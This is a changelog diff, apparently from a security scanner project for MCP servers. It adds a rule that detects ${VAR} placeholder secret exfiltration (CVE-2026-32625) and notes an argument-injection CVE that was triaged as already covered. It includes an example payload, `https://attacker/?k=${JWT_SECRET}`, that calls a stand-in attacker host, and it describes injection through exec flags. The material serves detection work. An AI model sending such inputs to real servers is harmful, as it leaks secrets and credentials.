@@ -7,6 +7,36 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added — AAK-MCP-ENV-PLACEHOLDER-EXFIL-001: ${VAR} env-placeholder secret exfiltration (CVE-2026-32625)
+
+CVE-response cycle item (closes #300). New **CRITICAL** rule + scanner
+(`scanners/mcp_env_placeholder_exfil.py`) flagging an MCP server that resolves
+`${VAR}` / `$VAR` placeholders against its own process environment
+(`process.env`, `os.path.expandvars`, `.format(**os.environ)`) while handling a
+user-supplied server config/URL. A user submitting
+`https://attacker/?k=${JWT_SECRET}` then makes the server interpolate its own
+secrets into the outbound request.
+
+[CVE-2026-32625](https://nvd.nist.gov/vuln/detail/CVE-2026-32625): LibreChat
+<= 0.8.3 resolved `${VAR}` against `process.env` during Zod validation of
+user-supplied MCP server URLs, leaking `CREDS_KEY`, `JWT_SECRET`, `MONGO_URI`
+(CWE-200, CVSS 9.6). Maps to **MCP01:2025** (Token Mismanagement), **ASI03**.
+TS/JS detection is comment-stripped; gated to MCP-context files. FP guards:
+verbatim URL use, plain `process.env` reads, non-MCP files, and a commented-out
+pattern all pass.
+
+### Anti-duplicate triage — CVE-2026-44450 closed as covered (no new rule)
+
+CVE-2026-44450 (Lumiverse < 0.9.7, CWE-88, CVSS 9.9 — MCP endpoint allowlists
+`command` but forwards `args` unvalidated; allowlisted binaries accept `-e`/`-c`
+exec flags) was triaged and **closed as already covered** (#280): the
+dynamic-args-to-spawn shape is `AAK-MCP-STDIO-CMD-INJ-002` and the
+launcher+exec-flag insight is `AAK-MCP-STDIO-LAUNCHER-INJECT-001`. No duplicate
+rule added.
+
+Rule count **219 → 220**; scanner modules **73 → 74**; Secret-Exposure category
+**17 → 18**. Version **0.3.32 → 0.3.33**.
+
 ### Added — AAK-MCP-TOOLGATE-ASYMMETRY-001: tools/list-vs-tools/call enforcement asymmetry (CVE-2026-46519)
 
 CVE-response cycle item. New **HIGH** rule + scanner
